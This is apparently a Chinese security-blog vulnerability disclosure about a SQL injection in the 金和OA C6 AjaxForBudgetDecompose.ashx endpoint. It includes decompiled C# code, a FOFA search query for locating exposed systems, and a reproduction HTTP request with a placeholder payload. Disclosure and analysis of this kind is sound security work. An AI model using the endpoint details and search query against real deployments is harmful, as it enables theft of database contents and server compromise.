---
title: "金和OA AjaxForBudgetDecompose.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-AjaxForBudgetDecompose-sqli.html
asset_dir: assets/金和oa-ajaxforbudgetdecompose.ashx-sql注入漏洞
---

# 金和OA AjaxForBudgetDecompose.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/12/23 13:05
* 278浏览
* [0评论](#comment)
* 22分钟阅读

深入探索

木马

SQL

数据库


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `AjaxForBudgetDecompose.ashx` 接口处存在SQL注入漏洞，攻击者除了可以利用[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

网络安全课程

Windows安全工具

网页浏览器

根据 `AjaxForBudgetDecompose.ashx` 的源码，在 `bin` 目录下查找 `JHBase.Web.CostControl.dll` 将其进行反编译后找到 **AjaxForBudgetDecompose** 的处理逻辑

```
public void ProcessRequest(HttpContext context)
{
  context.Response.ContentType = "text/plain";
  string str1 = context.Request["strType"];
  string str2 = context.Request["strYear"];
  if (string.op_Equality(str1, "getBudgetTime"))
  {
    DataSet divertInformation = new CostManager().Get_Budget_PeriodDivertInformation(str2);
else
{
  string strTime = context.Request["strTime"];
  DataTable decomposeManageList = this.budgetDecomposeDao.GetBudgetDecomposeManageList(str2, strTime);
```

当 `action=getBudgetTime` 时，`strYear`被带入`Get_Budget_PeriodDivertInformation`方法

```
public DataSet Get_Budget_PeriodDivertInformation(string YearPeriod)
{
  return this.GetDS_BySQL($"{" Select Budget_PeriodManage.YearPeriod,Budget_PeriodManage.Period,Budget_PeriodDivert.Status " + " from Budget_PeriodManage " + " Left outer join Budget_PeriodDivert " + " on Budget_PeriodDivert.YearPeriod = Budget_PeriodManage.YearPeriod " + " and  Budget_PeriodDivert.Period = Budget_PeriodManage.Period "} where Budget_PeriodDivert.Status is null and Budget_PeriodManage.YearPeriod ='{YearPeriod}'" + " order by YearPeriod asc ,Period asc " + "   select Period from Budget_PeriodManage where getdate() between begindate and enddate ");
}
```

参数`strYear`被直接拼接到SQL语句中执行，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞。

否则**strYear**、**strTime**会被带入**GetBudgetDecomposeManageList**方法

```
public DataTable GetBudgetDecomposeManageList(string strYear, string strTime)
{
  this.strSql = $"select * from BudgetDecomposeManage b \r\n                    where b.BudgetState <> 3 and BudgetYear = {strYear} and BudgetTime = {strTime}";
  return this.db.ExecSQLReDataTable(this.strSql);
}
```

存在相同的[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞

# 漏洞复现

```
POST /c6/JHSoft.Web.CostControl/Decompose/AjaxForBudgetDecompose.ashx HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

strType=getBudgetTime&strYear=SQLI_POC
```

[![金和OA AjaxForBudgetDecompose.ashx SQL注入漏洞](images/img-001-8a4f520aad1f.webp)](https://image.mrxn.net/6a3f2cc49a3445c98ef33713bc38099e.webp)

成功延时 4 秒

代码安全审计

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA AjaxForBudgetDecompose.ashx SQL注入漏洞](https://mrxn.net/jswz/jhsoft-AjaxForBudgetDecompose-sqli.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-AjaxForBudgetDecompose-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-AjaxForBudgetDecompose-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞预警服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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